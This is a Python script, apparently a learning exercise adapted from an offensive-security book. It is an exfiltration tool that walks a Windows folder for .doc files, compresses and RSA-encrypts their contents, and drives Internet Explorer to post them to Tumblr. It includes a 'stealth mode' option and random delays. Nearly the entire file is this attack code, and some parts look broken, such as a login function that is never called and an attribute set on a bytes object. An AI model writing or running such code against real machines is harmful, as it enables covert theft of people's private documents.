import win32com.client
import os
import fnmatch
import time
import random
import zlib
import base64

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc" # this is not taking into account new words extensions such as .docx

# these should be your tumblr login 
username = "admin@test.com"
password = "admin" 

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXUTgFoL/2EPKoN31l5T
lak7VxhdusNCWQKDfcN5Jj45GQ1oZZjsECQ8jK5AaQuCWdmEQkgCEV23L2y71G+T
h/zlVPjp0hgC6nOKOuwmlQ1jGvfVvaNZ0YXrs+sX/wg5FT/bTS4yzXeW6920tdls
2N7Pu5N1FLRW5PMhk6GW5rzVhwdDvnfaUoSVj7oKaIMLbN/TENvnwhZZKlTZeK79
ix4qXwYLe66CrgCHDf4oBJ/nO1oYwelxuIXVPhIZnVpkbz3IL6BfEZ3ZDKzGeRs6
YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS
1wIDAQAV
-----END PUBLIC KEY-----"""

def wait_for_browser(browser):
    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return

def encrypt_string(plaintext):
    chunk_size = 208
    if isinstance(plaintext, (str)):
        plaintext = plaintext.encode()
    print(f"Compressing: {len(plaintext)} bytes")
    plaintext = zlib.compress(plaintext)
    print(f"Encrypting: {len(plaintext)} bytes")
    
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)
    encrypted = b""
    offset = 0
    
    while offset < len(plaintext):
        chunk = plaintext[offset:offset + chunk_size]
        if len(chunk) % chunk_size != 0:
            chunk += b" " * (chunk_size - len(chunk))
        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size
        
    encrypted = base64.b64encode(encrypted)
    print(f"Base64 encoded crypto:{len(encrypted)}")
    return encrypted

def encrypt_post(filename):   
    with open (filename, "rb") as fd:
        contents = fd.read()
            
    encrypted_title = encrypt_string(filename)
    encrypted_body = encrypt_string(contents)
    
    return encrypted_title, encrypted_body

def random_sleep():
    time.sleep(random.randint(5, 10))
    return

def login_to_tumblr(ie):
    full_doc = ie.Document.all
    
    # iterate looking for the logout form
    for field in full_doc:
        if field.name == "email":
            field.setAttribute("value", username)
        elif field.name == "password":
            field.setAttribute("value", password)
    
    random_sleep()
    
    # you can be presented with different homepages 
    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError:
        pass 
    
    random_sleep()
    
    wait_for_browser(ie)
    return

def post_to_tumblr(ie, title, post):
    full_doc = ie.Document.all
    
    for field in full_doc:
        if field.id == "post_one":
            field.setAttribute("value", title)
            title_box = field
            field.focus()
        elif field.id == "post_two":
            field.setAttribute("innerHTML", post)
            print("Set text area")
            field.focus()
        elif field.id == "create_post":
            print("Found post button")
            post.form = field
            field.focus()
    
    # move focus away from the main content box
    random_sleep()
    title_box.focus()
    random_sleep()
    
    # post the form
    post.form.children[0].click()
    wait_for_browser(ie)
    
    random_sleep()
    return

def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1 # set to 0 for stealth mode
    
    # head to tumblr
    ie.Navigate("https://www.tumblr.com/login")
    wait_for_browser(ie)
    
    # encrypt the file
    title, body = encrypt_post(document_path)
    
    print("Creating new post...")
    post_to_tumblr(ie, title, body)
    print("Posted!")
    
    # Kill the IE instance
    ie.Quit()
    ie = None
    
    return

# main loop for doc discovery
# the book here use "for parent, directories, filenames in os.walk("C:\\"):"
for parent, directories, filenames in os.walk("C:\\Users\\user\\Downloads\\test"):
    for filename in fnmatch.filter(filenames, f"*{doc_type}"):
        document_path = os.path.join(parent, filename)
        print(f"Found: {document_path}")
        exfiltrate(document_path)
        input("Continue?")
        